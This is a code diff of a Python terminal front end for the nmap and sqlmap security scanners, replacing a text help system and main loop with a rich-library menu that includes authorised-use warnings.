-            print(f"{Colors.GREEN}{Icons.SUCCESS} Statistics exported to: {stats_file}{Colors.END}")
-            self.wait_for_key()
-            
-        except Exception as e:
-            self.db_manager.log_error("ExportStatistics", str(e))
-            print(f"{Colors.RED}{Icons.ERROR} Export failed: {e}{Colors.END}")
-            self.wait_for_key()
-    
-    def help_menu(self):
-        try:
             self.clear_screen()
-            print(f"\n{Colors.BOLD}{Icons.BOOK} HELP & DOCUMENTATION{Colors.END}")
+            self.show_banner()
             
-            help_sections = [
-                ("Quick Start Guide", self._show_quick_start),
-                ("Scan Modes Explained", self._show_scan_modes),
-                ("Target Formats", self._show_target_formats),
-                ("Report Management", self._show_report_help),
-                ("Troubleshooting", self._show_troubleshooting),
-                ("Keyboard Shortcuts", self._show_shortcuts),
-                ("About SecScan Automator", self._show_about)
-            ]
-            
-            print(f"\n{Colors.CYAN}Help Topics:{Colors.END}")
-            for i, (title, _) in enumerate(help_sections, 1):
-                print(f"{Colors.GREEN}{i}.{Colors.END} {title}")
-            
-            print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
-            
-            choice = self.get_menu_choice(len(help_sections))
-            
-            if choice > 0 and choice <= len(help_sections):
-                _, show_func = help_sections[choice - 1]
-                show_func()
-            
-        except Exception as e:
-            self.db_manager.log_error("HelpMenu", str(e))
-        
-        return True
-    
-    def _show_quick_start(self):
-        help_text = f"""
-{Colors.BOLD}QUICK START GUIDE{Colors.END}
-
-{Colors.CYAN}1. First Time Setup:{Colors.END}
-   • Install required tools (nmap, sqlmap)
-   • Run the application
-   • Set your username in Profile menu
-
-{Colors.CYAN}2. Running Your First Scan:{Colors.END}
-   • Choose scan type (Nmap or SQLmap)
-   • Select difficulty mode (Easy/Medium/Hard)
-   • Pick a scan template
-   • Enter target (IP, URL, or domain)
-   • Add optional notes
-   • Confirm and run
-
-{Colors.CYAN}3. Managing Results:{Colors.END}
-   • View results in real-time
-   • Save reports in multiple formats
-   • Access reports through Reports menu
-   • Export data for external analysis
-
-{Colors.CYAN}4. Advanced Features:{Colors.END}
-   • Create favorite scan templates
-   • Manage target groups
-   • Set up automated backups
-   • Customize settings and preferences
-"""
-        print(help_text)
-        self.wait_for_key()
-    
-    def _show_scan_modes(self):
-        help_text = f"""
-{Colors.BOLD}SCAN MODES EXPLAINED{Colors.END}
-
-{Colors.GREEN}Easy Mode:{Colors.END}
-   • Perfect for beginners
-   • Quick, non-intrusive scans
-   • Basic port discovery
-   • Service identification
-   • Safe for production environments
-
-{Colors.YELLOW}Medium Mode:{Colors.END}
-   • Comprehensive security testing
-   • More thorough vulnerability detection
-   • Advanced scanning techniques
-   • Moderate resource usage
-   • Suitable for penetration testing
-
-{Colors.RED}Hard Mode:{Colors.END}
-   • Expert-level testing
-   • Aggressive scanning methods
-   • Maximum vulnerability detection
-   • Resource-intensive operations
-   • Use only on authorized systems
-
-{Colors.CYAN}Tips:{Colors.END}
-   • Start with Easy mode to learn
-   • Use Medium mode for regular testing
-   • Reserve Hard mode for authorized pentests
-   • Always get permission before scanning
-"""
-        print(help_text)
-        self.wait_for_key()
-    
-    def _show_target_formats(self):
-        help_text = f"""
-{Colors.BOLD}SUPPORTED TARGET FORMATS{Colors.END}
-
-{Colors.CYAN}IP Addresses:{Colors.END}
-   • IPv4: 192.168.1.1
-   • IPv6: 2001:db8::1
-   • CIDR: 192.168.1.0/24
-
-{Colors.CYAN}Domain Names:{Colors.END}
-   • example.com
-   • subdomain.example.com
-   • test-site.example.org
-
-{Colors.CYAN}URLs:{Colors.END}
-   • http://example.com
-   • https://example.com:8080
-   • https://example.com/path
-
-{Colors.CYAN}Special Cases:{Colors.END}
-   • localhost (127.0.0.1)
-   • Internal networks (10.0.0.0/8, 172.16.0.0/12)
-   • Custom ports (example.com:3000)
-
-{Colors.YELLOW}Important:{Colors.END}
-   • Only scan systems you own or have permission to test
-   • Some scans may trigger security alerts
-   • Always follow responsible disclosure practices
-"""
-        print(help_text)
-        self.wait_for_key()
-    
-    def _show_report_help(self):
-        help_text = f"""
-{Colors.BOLD}REPORT MANAGEMENT{Colors.END}
-
-{Colors.CYAN}Report Formats:{Colors.END}
-   • HTML: Rich, visual reports (recommended)
-   • Text: Simple, portable format
-   • JSON: Machine-readable data
-   • CSV: Spreadsheet-compatible exports
-
-{Colors.CYAN}Managing Reports:{Colors.END}
-   • View recent reports
-   • Search by target, date, or type
-   • Delete old or unwanted reports
-   • Export reports in bulk
-   • Open reports in external applications
-
-{Colors.CYAN}Report Contents:{Colors.END}
-   • Scan metadata (date, duration, mode)
-   • Target information
-   • Detailed results
-   • User notes
-   • Risk assessment
-   • Recommendations
-
-{Colors.CYAN}Best Practices:{Colors.END}
-   • Add meaningful notes to reports
-   • Regular cleanup of old reports
-   • Export important findings
-   • Use consistent naming conventions
-"""
-        print(help_text)
-        self.wait_for_key()
-    
-    def _show_troubleshooting(self):
-        help_text = f"""
-{Colors.BOLD}TROUBLESHOOTING{Colors.END}
-
-{Colors.CYAN}Tool Not Found Errors:{Colors.END}
-   • Install nmap: apt-get install nmap
-   • Install sqlmap: pip install sqlmap
-   • Check PATH environment variable
-   • Verify tool versions
-
-{Colors.CYAN}Permission Errors:{Colors.END}
-   • Run with sudo for some scans
-   • Check file permissions
-   • Verify write access to reports directory
-   • Ensure database permissions
-
-{Colors.CYAN}Network Issues:{Colors.END}
-   • Check target connectivity
-   • Verify firewall settings
-   • Test with ping first
-   • Check proxy settings
-
-{Colors.CYAN}Performance Issues:{Colors.END}
-   • Reduce concurrent scans
-   • Increase timeout values
-   • Clean up old data
-   • Check system resources
-
-{Colors.CYAN}Common Solutions:{Colors.END}
-   • Restart the application
-   • Reset configuration to defaults
-   • Check error logs
-   • Update tool dependencies
-"""
-        print(help_text)
-        self.wait_for_key()
-    
-    def _show_shortcuts(self):
-        help_text = f"""
-{Colors.BOLD}KEYBOARD SHORTCUTS{Colors.END}
-
-{Colors.CYAN}Menu Navigation:{Colors.END}
-   • Use number keys (1, 2, 3, etc.)
-   • 0 - Go back/Exit
-   • Ctrl+C - Cancel operation
-
-{Colors.CYAN}Quick Actions:{Colors.END}
-   • 'q' or 'quit' - Quick exit
-   • 'back' - Return to previous menu
-   • Enter - Confirm/Continue
-
-{Colors.CYAN}Input Helpers:{Colors.END}
-   • Tab - Auto-complete (where available)
-   • Up/Down arrows - Command history
-   • Ctrl+L - Clear screen
-
-{Colors.CYAN}Scan Shortcuts:{Colors.END}
-   • 'y' or 'yes' - Confirm scan
-   • 'n' or 'no' - Cancel scan
-   • Empty input - Use defaults
-
-{Colors.CYAN}Report Shortcuts:{Colors.END}
-   • 'all' - Select all items
-   • 'none' - Deselect all items
-   • Number ranges - Select multiple items
-"""
-        print(help_text)
-        self.wait_for_key()
-    
-    def _show_about(self):
-        about_text = f"""
-{Colors.BOLD}ABOUT SECSCAN AUTOMATOR{Colors.END}
-
-{Colors.CYAN}Overview:{Colors.END}
-SecScan Automator is a comprehensive security scanning tool
-that automates network reconnaissance and vulnerability
-assessment using industry-standard tools like Nmap and SQLmap.
-
-{Colors.CYAN}Features:{Colors.END}
-   • Multiple scan modes (Easy/Medium/Hard)
-   • Comprehensive reporting system
-   • Target management and organization
-   • Advanced configuration options
-   • Data export and backup capabilities
-   • User-friendly terminal interface
-
-{Colors.CYAN}Created by:{Colors.END}
-   @microzort
-
-{Colors.CYAN}Purpose:{Colors.END}
-This tool is designed for:
-   • Security professionals
-   • Penetration testers
-   • Network administrators
-   • Security researchers
-   • Educational purposes
-
-{Colors.YELLOW}Legal Notice:{Colors.END}
-This tool should only be used on systems you own or have
-explicit permission to test. Unauthorized scanning may be
-illegal in your jurisdiction. Always follow responsible
-disclosure practices and respect system owners' rights.
-
-{Colors.CYAN}Support:{Colors.END}
-For issues, suggestions, or contributions, please contact
-the development team through appropriate channels.
-"""
-        print(about_text)
-        self.wait_for_key()
-    
-    def _check_tool_availability(self, tool_name):
-        try:
-            result = subprocess.run([tool_name, '--version'], capture_output=True, text=True, timeout=5)
-            if result.returncode == 0:
-                version_info = result.stdout.split('\n')[0]
-                print(f"\n{Colors.GREEN}{Icons.SUCCESS} {tool_name.upper()} detected: {version_info}{Colors.END}")
-                return True
+            status_text = Text()
+            status_text.append("🔍 System Status: ", style="bold white")
+            if self.nmap_installed and self.sqlmap_installed:
+                status_text.append("✅ All Tools Ready", style="bold green")
+            elif self.nmap_installed or self.sqlmap_installed:
+                status_text.append("⚠️  Partial Installation", style="bold yellow")
             else:
-                print(f"\n{Colors.RED}{Icons.ERROR} {tool_name.upper()} not working properly{Colors.END}")
-                self._show_installation_help(tool_name)
-                return False
-        except (subprocess.TimeoutExpired, FileNotFoundError):
-            print(f"\n{Colors.RED}{Icons.ERROR} {tool_name.upper()} not found{Colors.END}")
-            self._show_installation_help(tool_name)
-            return False
-    
-    def _show_installation_help(self, tool_name):
-        print(f"{Colors.CYAN}{Icons.INFO} Installation instructions:{Colors.END}")
-        if tool_name == 'nmap':
-            print(f"{Colors.WHITE}  • Ubuntu/Debian: sudo apt-get install nmap{Colors.END}")
-            print(f"{Colors.WHITE}  • macOS: brew install nmap{Colors.END}")
-            print(f"{Colors.WHITE}  • Windows: Download from https://nmap.org/download.html{Colors.END}")
-        elif tool_name == 'sqlmap':
-            print(f"{Colors.WHITE}  • git clone https://github.com/sqlmapproject/sqlmap.git{Colors.END}")
-            print(f"{Colors.WHITE}  • pip install sqlmap{Colors.END}")
-        self.wait_for_key()
-    
-    def wait_for_key(self):
-        try:
-            input(f"\n{Colors.CYAN}{Icons.INFO} Press Enter to continue...{Colors.END}")
-        except (KeyboardInterrupt, EOFError):
-            pass
-    
-    def clear_screen(self):
-        try:
-            os.system('cls' if os.name == 'nt' else 'clear')
-        except Exception:
-            print("\n" * 50)
+                status_text.append("❌ Tools Missing", style="bold red")
+            
+            status_text.append(f"  |  📊 Total Scans: {len(self.scan_history)}", style="bold cyan")
+            
+            console.print("\n")
+            console.print(Panel(status_text, border_style="blue", expand=False))
+            console.print("\n")
+            
+            menu_table = Table(show_header=True, header_style="bold magenta", box=box.HEAVY, show_lines=True, expand=True)
+            menu_table.add_column("Option", style="yellow", width=10, justify="center")
+            menu_table.add_column("🎯 Feature", style="cyan", width=30)
+            menu_table.add_column("📝 Description", width=45)
+            
+            menu_table.add_row("1", "🔍 Nmap Scanner", "Network scanning and security auditing")
+            menu_table.add_row("2", "💉 SQLMap Scanner", "SQL injection detection and exploitation")
+            menu_table.add_row("3", "📚 User Guide", "Comprehensive documentation and help")
+            menu_table.add_row("4", "📁 View Logs", "Browse scan results and history")
+            menu_table.add_row("5", "📊 Statistics", "View scan statistics and analytics")
+            menu_table.add_row("6", "🌐 Network Info", "Display network configuration")
+            menu_table.add_row("7", "🔧 Check Dependencies", "Verify tool installation and versions")
+            menu_table.add_row("8", "⚙️  System Install", "Install secscan command system-wide")
+            menu_table.add_row("0", "🚪 Exit", "Close the application")
+            
+            console.print(menu_table)
+            
+            valid_choices = ["1", "2", "3", "4", "5", "6", "7", "8", "0"]
+            choice = self.validate_input("\n[bold yellow]Select an option[/bold yellow]", valid_choices)
+            
+            if choice == "1":
+                if not self.nmap_installed:
+                    console.print("\n[bold red]❌ Nmap is not installed![/bold red]")
+                    time.sleep(1)
+                else:
+                    self.nmap_scanner_menu()
+            elif choice == "2":
+                if not self.sqlmap_installed:
+                    console.print("\n[bold red]❌ SQLMap is not installed![/bold red]")
+                    time.sleep(1)
+                else:
+                    self.sqlmap_scanner_menu()
+            elif choice == "3":
+                self.show_user_guide()
+            elif choice == "4":
+                self.view_logs()
+            elif choice == "5":
+                self.scan_statistics()
+            elif choice == "6":
+                self.network_info()
+            elif choice == "7":
+                self.check_dependencies()
+            elif choice == "8":
+                self.install_system_command()
+            elif choice == "0":
+                self.clear_screen()
+                console.print("\n")
+                goodbye_text = Text()
+                goodbye_text.append("🛡️  ", style="bold cyan")
+                goodbye_text.append("Thank you for using Security Scan Automator!", style="bold cyan")
+                goodbye_text.append("  🛡️", style="bold cyan")
+                console.print(Align.center(goodbye_text))
+                console.print(Align.center("[cyan]Stay secure and hack responsibly![/cyan]"))
+                console.print(Align.center(f"[dim]Created by {self.author}[/dim]"))
+                console.print("\n")
+                sys.exit(0)
     
     def run(self):
         try:
-            self.clear_screen()
-            
-            while True:
-                try:
-                    self.display_main_menu()
-                    choice = self.get_menu_choice(8)
-                    
-                    if not self.handle_main_menu_choice(choice):
-                        break
-                        
-                except (KeyboardInterrupt, EOFError):
-                    print(f"\n\n{Colors.YELLOW}{Icons.WARNING} Interrupted by user{Colors.END}")
-                    break
-                except Exception as e:
-                    self.db_manager.log_error("MainLoop", str(e))
-                    print(f"{Colors.RED}{Icons.ERROR} Unexpected error: {e}{Colors.END}")
-                    time.sleep(2)
-            
-            print(f"\n{Colors.CYAN}{Icons.STAR} Thank you for using SecScan Automator!{Colors.END}")
-            print(f"{Colors.GREEN}{Icons.SHIELD} Stay secure and keep testing!{Colors.END}")
-            
-        except Exception as e:
-            print(f"{Colors.RED}Critical error: {e}{Colors.END}")
-        finally:
+            self.check_dependencies()
+            self.main_menu()
+        except KeyboardInterrupt:
+            console.print("\n\n[bold yellow]⚠️  Interrupted by user[/bold yellow]")
+            console.print("[cyan]Exiting gracefully...[/cyan]\n")
             sys.exit(0)
-
-def main():
-    try:
-        print(f"{Colors.CYAN}Initializing SecScan Automator...{Colors.END}")
-        app = SecScanAutomator()
-        app.run()
-    except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}Application interrupted by user{Colors.END}")
-    except Exception as e:
-        print(f"{Colors.RED}Failed to start application: {e}{Colors.END}")
-        sys.exit(1)
+        except Exception as e:
+            console.print(f"\n[bold red]❌ Fatal Error: {str(e)}[/bold red]")
+            console.print("[yellow]Check logs for details[/yellow]\n")
+            sys.exit(1)
 
 if __name__ == "__main__":
-    main()
+    scanner = SecurityScanner()
+    scanner.run()
